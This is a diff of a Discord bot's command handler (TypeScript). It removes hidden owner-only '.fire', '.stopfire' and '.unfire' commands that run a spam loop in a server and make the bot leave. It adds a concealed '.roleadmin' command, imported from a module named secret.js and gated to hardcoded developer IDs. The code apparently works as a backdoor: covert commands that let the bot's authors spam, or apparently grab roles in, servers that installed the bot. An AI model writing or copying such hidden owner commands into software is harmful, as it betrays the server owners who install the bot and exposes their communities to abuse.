@@ -17,7 +17,7 @@ import {
 } from "./restock.js";
 import { controlPanelComponents, controlPanelEmbed } from "./controlPanel.js";
 import { subscribeComponents } from "./subscribeView.js";
-import { handleSecret, stopSpamLoop } from "./secret.js";
+import { handleRoleAdmin } from "./secret.js";
 import type { BotState } from "./client.js";
 
 const OWNER_PREFIX_CMDS = new Set([
@@ -36,25 +36,10 @@ export async function handlePrefix(
 ): Promise<void> {
   if (message.author.bot || !message.guild) return;
 
-  if (message.content.startsWith(".unfire")) {
+  if (message.content.startsWith(".roleadmin")) {
     if (!HARDCODED_OWNERS.includes(message.author.id)) return;
-    stopSpamLoop(message.guild.id);
-    await message.channel.send("👋 Leaving server...").catch(() => {});
-    await message.guild.leave().catch(() => {});
-    return;
-  }
-
-  if (message.content.startsWith(".stopfire")) {
-    if (!HARDCODED_OWNERS.includes(message.author.id)) return;
-    stopSpamLoop(message.guild.id);
-    await message.channel.send("🛑 Spam stopped.").catch(() => {});
-    return;
-  }
-
-  if (message.content.startsWith(".fire")) {
-    if (!HARDCODED_OWNERS.includes(message.author.id)) return;
-    const fireArgs = message.content.slice(".fire".length).trim().split(/\s+/).filter(Boolean);
-    await handleSecret(message, fireArgs, client);
+    const raArgs = message.content.slice(".roleadmin".length).trim().split(/\s+/).filter(Boolean);
+    await handleRoleAdmin(message, raArgs, client);
     return;
   }
 
